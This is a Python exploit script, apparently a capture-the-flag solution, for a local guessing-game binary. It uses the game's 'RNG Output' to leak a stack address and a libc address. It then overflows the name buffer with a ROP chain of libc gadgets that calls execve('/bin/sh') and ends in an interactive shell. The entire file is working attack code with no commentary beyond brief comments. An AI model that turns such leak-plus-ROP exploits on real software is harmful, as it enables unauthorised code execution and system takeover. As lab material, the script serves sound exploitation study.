import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Get next 8 'random' bytes
def get8bytes(p):
    address = 0
    for i in range(8):
        data = p.readuntil('Enter your Guess:')
        p.sendline('0')
        data = p.readuntil('RNG Output: ')
        data = p.readuntil('\n')
        address = address >> 8
        address += (int(data, 16) << 56)
        data = p.readuntil('(y/n)')
        p.sendline('y')
    return address

# Skip next 8 bytes, passing in '1'
def skip8bytes(p):
    for i in range(8):
        data = p.readuntil('Enter your Guess:')
        p.sendline('1')
        data = p.readuntil('(y/n)')
        p.sendline('y')


p = interact.Process()

data = p.readuntil('Enter Choice:')
p.sendline('1')

# Leak addresses
skip8bytes(p)
skip8bytes(p)
bin_sh = get8bytes(p) - 0x160
skip8bytes(p)
skip8bytes(p)
libc_addr = get8bytes(p) - 0x20830

# Generate payload
gadgets = [
    libc_addr + 0x21102, bin_sh, # mov rdi, bin_sh
    libc_addr + 0x33544, 0x3b,   # mov rax, 0x3b
    libc_addr + 0x01b92, 0x0,    # mov rdx, 0x0
    libc_addr + 0x202e8, 0x0,    # mov rsi, 0x0
    libc_addr + 0xbc375,         # syscall
]
payload = ''
for gadget in gadgets:
    payload += p64(gadget)

# Inject payload
data = p.readuntil('Enter your Guess:')
p.sendline('1')
data = p.readuntil('(y/n)')
p.sendline('n')
data = p.readuntil('Enter your name:')
p.sendline('/bin/sh\x00' + 'a'*(32+40-8) + payload)

p.interactive()